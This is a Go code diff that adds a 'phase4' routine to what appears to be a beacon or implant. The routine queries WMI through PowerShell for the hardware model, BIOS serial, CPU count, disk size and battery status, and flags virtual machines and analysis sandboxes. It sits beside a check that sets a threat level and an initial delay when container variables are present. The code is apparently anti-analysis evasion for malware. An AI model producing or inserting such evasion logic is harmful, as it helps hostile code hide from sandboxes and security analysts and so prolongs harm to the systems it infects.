@@ -144,6 +144,66 @@ func phase3(p *beacon.TargetProfile) {
 	}
 }
 
+// phase4 detects VM and sandbox environments on Windows.
+func phase4(p *beacon.TargetProfile) {
+	out, _ := shell.Run("powershell -Command \"(Get-WmiObject Win32_ComputerSystem).Model\"", 10e9)
+	model := strings.ToLower(strings.TrimSpace(out))
+	vmModels := map[string]string{
+		"virtualbox":                              "VirtualBox",
+		"vmware":                                  "VMware",
+		"vmware virtual platform":                 "VMware",
+		"kvm":                                     "KVM",
+		"qemu":                                    "QEMU",
+		"parallels":                               "Parallels",
+		"xen":                                     "Xen",
+		"microsoft corporation virtual machine":    "Hyper-V",
+		"virtual machine":                         "",
+	}
+	for substr, vendor := range vmModels {
+		if strings.Contains(model, substr) {
+			p.IsVM = true
+			if vendor != "" {
+				p.VMVendor = vendor
+			} else {
+				p.VMVendor = "Unknown"
+			}
+			break
+		}
+	}
+
+	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_BIOS).SerialNumber\"", 10e9)
+	serial := strings.TrimSpace(out)
+	if strings.Contains(strings.ToLower(serial), "vmware") || strings.Contains(strings.ToLower(serial), "virtual") {
+		if !p.IsVM {
+			p.IsVM = true
+			p.VMVendor = "Unknown"
+		}
+	}
+
+	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors\"", 10e9)
+	fmt.Sscanf(out, "%d", &p.CPUCount)
+	if p.CPUCount < 2 {
+		p.IsSandbox = true
+		p.Hints = append(p.Hints, fmt.Sprintf("low cpu count: %d", p.CPUCount))
+	}
+
+	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_DiskDrive | Select-Object -First 1).Size\"", 10e9)
+	var diskBytes int64
+	fmt.Sscanf(out, "%d", &diskBytes)
+	if diskBytes > 0 {
+		p.DiskSizeGB = diskBytes / 1024 / 1024 / 1024
+		if p.DiskSizeGB < 100 {
+			p.Hints = append(p.Hints, fmt.Sprintf("small disk: %dGB", p.DiskSizeGB))
+		}
+	}
+
+	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_Battery).EstimatedChargeRemaining\" 2>$null", 5e9)
+	p.HasBattery = strings.TrimSpace(out) != ""
+	if !p.HasBattery {
+		p.Hints = append(p.Hints, "no battery detected")
+	}
+}
+
 func QuickCheck() (threatLevel string, initialDelay time.Duration) {
 	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
 		return "medium", 90 * time.Second
